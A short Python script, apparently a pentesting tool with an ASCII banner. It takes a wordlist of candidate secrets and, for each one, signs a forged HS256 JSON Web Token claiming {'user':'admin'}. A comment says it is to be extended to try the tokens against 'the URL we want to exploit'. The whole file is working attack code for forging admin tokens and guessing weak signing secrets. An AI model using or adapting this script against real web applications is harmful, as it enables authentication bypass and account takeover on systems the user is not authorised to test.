
#script that create JWT with secret. based on HS256(HMAC that uses symetric key to create the header and payload for Json Web Token)
#This script is to be improved, to also try the JWT generate over the URL we want to exploit
#
#!/usr/bin/python
import sys
import jwt
import base64


def usage():
        print " ____        _         _   _      ____  "
        print "| __ )  ___ | | ___ __| \ | |_ __| __ ) "
        print "|  _ \ / _ \| |/ / '__|  \| | '__|  _ \ "
        print "| |_) | (_) |   <| |  | |\  | |  | |_) |"
        print "|____/ \___/|_|\_\_|  |_| \_|_|  |____/ "
        print " "
        print " Usage:"
        print "python jwt_gen.py [secret list]"
        print " "
        print " "
        sys.exit()


def main():
        if not len(sys.argv[1:]):
                usage()
        else:
                brute()

        sys.exit()

def brute():
        list = open(sys.argv[1])
        secret = list.read().split('\n')
        for line in secret:

                encoded = jwt.encode({'user':'admin'}, line, algorithm='HS256')
                print "Secret: %s ---> %s" %(line,encoded)

        sys.exit()

main()
